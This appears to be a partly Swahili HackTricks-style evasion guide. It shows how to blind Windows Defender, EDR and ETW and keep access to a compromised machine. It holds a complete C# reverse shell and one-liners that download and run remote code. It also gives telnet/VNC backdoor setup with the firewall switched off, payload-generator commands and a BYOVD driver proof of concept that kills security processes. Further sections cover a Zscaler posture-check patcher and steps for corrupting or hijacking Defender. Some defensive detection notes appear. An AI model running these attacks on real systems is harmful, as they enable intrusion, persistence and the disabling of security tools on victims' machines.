<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mekanismo wenye nguvu wa logging katika Windows unaowawezesha applications na system components **kurekodi matukio**. Hata hivyo, pia inaweza kutumiwa na bidhaa za usalama kufuatilia na kugundua malicious activities.

Similar to how AMSI is disabled (bypassed) it's also possible to make the **`EtwEventWrite`** function of the user space process return immediately without logging any events. Hii inafanywa kwa ku-patch function hiyo kwenye memory ili irudi mara moja, kwa ufanisi kuzima ETW logging kwa process hiyo.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ku-load C# binaries kwenye memory imejulikana kwa muda mrefu na bado ni njia nzuri ya kuendesha post-exploitation tools bila kugunduliwa na AV.

Since the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:

- **Fork\&Run**

Inahusisha **spawning a new sacrificial process**, inject your post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process. Hii ina faida na hasara. Faida ya fork and run ni kwamba utekelezaji unafanyika **outside** ya Beacon implant process yetu. Hii inamaanisha kwamba ikiwa kitu katika hatua zetu za post-exploitation kitapotea au kitakamatwa, kuna **much greater chance** ya **implant yetu kuishi.** Hasara ni kwamba una **greater chance** ya kukamatwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu injecting the post-exploitation malicious code **into its own process**. Njia hii inakusaidia kuepuka kuunda process mpya na kuipata ikiskaniwa na AV, lakini hasara ni kwamba ikiwa kitu kitakwenda mrama wakati wa utekelezaji wa payload yako, kuna **much greater chance** ya **losing your beacon** kwani inaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza malicious code kwa kutumia lugha nyingine kwa kumpa mashine iliyoshambuliwa access **to the interpreter environment installed on the Attacker Controlled SMB share**.

Kwa kuruhusu access kwa Interpreter Binaries na environment kwenye SMB share unaweza **execute arbitrary code in these languages within memory** ya mashine iliyoshambuliwa.

The repo inabainisha: Defender bado anaskana scripts lakini kwa kutumia Go, Java, PHP n.k. tuna **more flexibility to bypass static signatures**. Majaribio na random un-obfuscated reverse shell scripts katika lugha hizi yameonekana kuwa mafanikio.

## TokenStomping

Token stomping ni mbinu inayomruhusu attacker **manipulate the access token or a security prouct like an EDR or AV**, kwa kuwaperesha privileges ili process isiye kufa bado isiwe na ruhusa za kuangalia malicious activities.

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi kabisa ku-deploy Chrome Remote Desktop kwenye PC ya dhaifu kisha kuitumia kuichukua na kudumisha persistence:
1. Download kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", kisha bonyeza faili la MSI kwa Windows ili kupakua MSI file.
2. Run the installer silently kwenye victim (inahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Wizard itakuuliza u-authorize; bonyeza Authorize button kuendelea.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin inayo ruhusu kuweka pin without using the GUI).


## Advanced Evasion

Evasion ni mada ngumu sana; wakati mwingine lazima uzingatie vyanzo vingi tofauti vya telemetry ndani ya mfumo mmoja, kwa hivyo karibu haiwezekani kubaki kabisa bila kugunduliwa katika mazingira yenye ustadi.

Kila mazingira unayoshambulia yatakuwa na nguvu na udhaifu wake.

Nikupongeze sana uangalie talk hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata ufahamu wa zaidi kuhusu Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

hii pia ni talk nyingine nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Kale**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo ita **remove parts of the binary** hadi itakapogundua ni **which part Defender** inaona kama malicious na itakuigawa kwako.\
Chombo kingine kinachofanya kitu sawa ni [**avred**](https://github.com/dobin/avred) kinachotoa huduma hiyo kupitia tovuti ya wazi katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilitoka na Telnet server ambayo unaweza ku-install (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ifanye **ianze** wakati mfumo unapoanza na **endeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) na zima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka bin downloads, si setup)

**ON THE HOST**: Endesha _**winvnc.exe**_ na sanidi server:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

The **attacker** anapaswa kutekeleza ndani ya **host** yake binary `vncviewer.exe -listen 5900` ili itakuwa **imetayarishwa** kukamata reverse **VNC connection**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Ili kudumisha kutofahamika lazima usifanye mambo kadhaa

- Usianze `winvnc` ikiwa tayari inakimbia au utasababisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inakimbia kwa `tasklist | findstr winvnc`
- Usianze `winvnc` bila `UltraVNC.ini` katika saraka ile ile au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiendeshe `winvnc -h` kwa msaada au utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **start the lister** kwa kutumia `msfconsole -r file.rc` na **execute** the **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mlinzi wa sasa atakata mchakato haraka sana.**

### Kujenga reverse shell yetu

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### C# Revershell ya kwanza

Jenga kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji otomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR kutoka Kernel Space

Storm-2603 ilitumia utility ndogo ya console inayojulikana kama **Antivirus Terminator** kuweka pembeni ulinzi wa endpoint kabla ya kutupa ransomware. Zana hiyo inaleta **driver yake mwenye udhaifu lakini *imefutwa sahihi*** na kuitumia kuendesha operesheni za kernel zenye vipaumbele ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzizuia.

Mambo muhimu ya kujua
1. **Signed driver**: Faili lililowekwa kwenye disk ni `ServiceMouse.sys`, lakini binary ni driver iliyo na saini halali `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu driver ina saini halali ya Microsoft, inajazwa hata wakati Driver-Signature-Enforcement (DSE) imewezeshwa.
2. **Usakinishaji wa service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili driver kama **kernel service** na wa pili unaianzisha ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs zinazofunguliwa na driver**
| IOCTL code | Uwezo                              |
|-----------:|------------------------------------|
| `0x99000050` | Kuua mchakato wowote kwa PID (kutumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Kufuta faili lolote kwenye disk |
| `0x990001D0` | Kuondoa driver na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Kwa nini inafanya kazi**: BYOVD inakata kabisa ulinzi wa user-mode; code inayotekelezwa katika kernel inaweza kufungua mchakato *uliolemazwa*, kuwaua, au kubadili vitu vya kernel bila kujali PPL/PP, ELAM au vipengele vingine vya kuimarisha.

Uchunguzi / Kupunguza
•  Wezesha orodha ya kuzuia vulnerable-driver ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kuleta `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa service mpya za *kernel* na toa tahadhari wakati driver inapopakiwa kutoka saraka inayoweza kuandikwa na kila mtu au haipo kwenye orodha ya kuruhusiwa.
•  Angalia kushikiliwa kwa user-mode kwa device objects maalum ikifuatiwa na wito hatari za `DeviceIoControl`.

### Kupita Zscaler Client Connector Posture Checks kupitia On-Disk Binary Patching

Zscaler’s **Client Connector** inatumia sheria za device-posture kwa eneo la mteja na inategemea Windows RPC kuwasilisha matokeo kwa sehemu nyingine. Uchaguzi mbili duni za muundo zinafanya upitisho kamili kuwa uwezekano:

1. Tathmini ya posture hufanywa **kabisa upande wa client** (boolean hutumwa kwa server).
2. Endpoints za ndani za RPC zinathibitisha tu kwamba executable inayounganisha **imefutwa na Zscaler** (kupitia `WinVerifyTrust`).

Kwa **kufanyia patch binaries nne zilizosainiwa kwenye disk** mekanismi zote mbili zinaweza kuzimwa:

| Binary | Loji asilia iliyofanyiwa patch | Matokeo |
|--------|-------------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Humesubiri kila wakati `1` kwa hivyo kila ukaguzi unakubaliwa |
| `ZSAService.exe` | Wito wa njia isiyo ya moja kwa moja kwa `WinVerifyTrust` | NOP-ed ⇒ mchakato wowote (hata usio na saini) unaweza kuingia kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Imebadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa uadilifu kwenye tunnel | Umekatwa (short-circuited) |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za awali na kuanzisha tena service stack:

* **Mithibio yote** ya posture inaonyesha **kijani/kimekubaliwa**.
* Binaries ambazo hazijasainiwa au zilizobadilishwa zinaweza kufungua named-pipe RPC endpoints (mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kifaa kilichotekwa kinapata ufikaji usio na vizingiti kwenye mtandao wa ndani uliobainishwa na sera za Zscaler.

Utafiti huu wa kesi unaonyesha jinsi maamuzi ya kuaminiana upande wa mteja pekee na ukaguzi rahisi wa saini vinaweza kushindwa kwa patches chache za byte.

## Kutumia vibaya Protected Process Light (PPL) ili kuingilia AV/EDR kwa LOLBINs

Protected Process Light (PPL) inatekeleza muundo wa mamlaka wa signer/level ili tu protected processes zenye hadhi sawa au ya juu zinaweza kuingiliana kwa kila mmoja. Katika mashambulizi, ukifaulu kuanzisha binary iliyowezeshwa na PPL kwa njia halali na kudhibiti hoja zake, unaweza kubadilisha utendakazi usio hatari (mfano, logging) kuwa primitive ndogo ya kuandika inayoungwa mkono na PPL dhidi ya saraka zilizolindwa zinazotumika na AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Msaidizi wa open-source: CreateProcessAsPPL (huchagua kiwango cha ulinzi na hupitisha hoja kwa EXE lengwa):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Mfano wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujijengea mchakato na inakubali parameta ili kuandika faili ya log kwenye njia iliyotajwa na muite.
- Ikitumiwa kama mchakato wa PPL, uandishi wa faili hufanyika kwa msaada wa PPL.
- ClipUp haiwezi kuchambua njia zenye nafasi; tumia 8.3 short paths kuonyesha kwenye maeneo yaliyolindwa kawaida.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Maelezo na vikwazo
- Huwezi kudhibiti yaliyomo ambavyo ClipUp inaandika zaidi ya mahali pa kuwekwa; tekniki hii inafaa zaidi kwa uharibifu badala ya uingizaji sahihi wa yaliyomo.
- Inahitaji local admin/SYSTEM ili kusanidi/kuanzisha service na fursa ya reboot.
- Muda ni muhimu: lengo halipaswi kuwa wazi; utekelezaji wakati wa boot huepuka vishikio vya faili.

Utambuzi
- Uundaji wa mchakato wa `ClipUp.exe` na hoja zisizo za kawaida, hasa ukiwa chini ya launchers zisizo za kawaida, wakati wa boot.
- Services mpya zilizowekwa kuanza kiotomatiki zikiwa zinajiendesha binaries zenye shaka na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kwa startup ya Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye binaries za Defender/mafolda ya Platform; uundaji/urekebishaji wa faili usiotarajiwa na michakato yenye bendera za protected-process.
- Telemetry ya ETW/EDR: tazama michakato iliyoundwa kwa kutumia `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya ngazi ya PPL na binaries zisizo za AV.

Mikakati ya kupunguza hatari
- WDAC/Code Integrity: zuia ni binaries zipi zilizotiwa saini zinaweza kuendeshwa kama PPL na chini ya wazazi gani; zuia ClipUp invocation nje ya muktadha halali.
- Usafi wa service: zuia uundaji/urekebishaji wa services za kuanza kiotomatiki na fuatilia uchezaji wa mpangilio wa kuanza.
- Hakikisha Defender tamper protection na early-launch protections zimeshawashwa; chunguza makosa ya startup yanayoonyesha uharibifu wa binary.
- Fikiria kuzima uundaji wa majina mafupi ya 8.3 kwenye volumu zinazohifadhi zana za usalama ikiwa inafaa kwa mazingira yako (jaribu kwa kina).

Marejeo kwa PPL na zana
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya folda ya Platform)
- Uwezo wa kureboot au kusababisha Defender platform re-selection (kuanzisha tena service wakati wa boot)
- Zana za kujengewa ndani pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender hupiga marufuku maandishi katika folda zake, lakini uteuzi wa platform unamwamini vingozi vya directory na huchagua toleo la juu kwa mujibu wa lexicographic bila kuthibitisha kwamba lengo linaelekezwa kwa njia iliyo salama/iliyothibitishwa.

Step-by-step (example)
1) Andaa nakala inayoweza kuandikwa ya folda ya platform ya sasa, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Tengeneza symlink ya directory yenye toleo la juu ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger selection (inashauriwa kuanzisha upya):
```cmd
shutdown /r /t 0
```
4) Thibitisha MsMpEng.exe (WinDefend) inaendesha kutoka kwenye njia iliyohamishwa:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya mchakato chini ya `C:\TMP\AV\` na usanidi wa huduma/registry unaoonyesha eneo hilo.

Post-exploitation options
- DLL sideloading/code execution: Weka/badilisha DLLs ambazo Defender anazipakia kutoka saraka yake ya programu ili kutekeleza msimbo katika michakato ya Defender. Angalia sehemu hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili wakati wa kuanzisha kwa mara inayofuata njia iliyosanidiwa isiweze kutatuliwa na Defender ashindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba mbinu hii haipati privilege escalation yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams wanaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya module lengwa yenyewe kwa ku-hook Import Address Table (IAT) yake na kupitisha APIs zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii inapanua evasion zaidi ya uso mdogo wa API ambao kits nyingi zinaonyesha (mf., CreateProcessA), na inatoa ulinzi sawa kwa BOFs na post‑exploitation DLLs.

## Mbinu ya kiwango cha juu
- Weka PIC blob kando ya target module kwa kutumia reflective loader (prepended au companion). PIC inapaswa kuwa self‑contained na position‑independent.
- Wakati host DLL inapoanza kupakia, pita IMAGE_IMPORT_DESCRIPTOR yake na patch entry za IAT kwa imports zilizolengwa (mf., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili zijielekeze kwenye PIC wrappers nyembamba.
- Kila PIC wrapper inatekeleza evasions kabla ya tail‑calling anwani halisi ya API. Evasions za kawaida ni:
  - Memory mask/unmask kabla na baada ya call (mf., encrypt beacon regions, RWX→RX, badilisha majina/permissions za ukurasa) kisha rudisha baada ya call.
  - Call‑stack spoofing: tengeneza benign stack na uhamishe kwenye target API ili call‑stack analysis iresolve kwa frames zinazotarajiwa.
- Kwa ajili ya compatibility, export interface ili Aggressor script (au sawa) iweze kusajili APIs zipi za-hook kwa Beacon, BOFs na post‑ex DLLs.

## Kwa nini IAT hooking hapa
- Inafanya kazi kwa code yoyote inayotumia import iliyohook, bila kubadilisha code ya tool au kutegemea Beacon ku-proxy APIs maalum.
- Inashughulikia post‑ex DLLs: hooking LoadLibrary* inakuwezesha kupiga intercept module loads (mf., System.Management.Automation.dll, clr.dll) na kutumia ile ile masking/stack evasion kwa API calls zao.
- Inarejesha matumizi ya kuaminika ya process‑spawning post‑ex commands dhidi ya call‑stack–based detections kwa ku-wrap CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Vidokezo
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
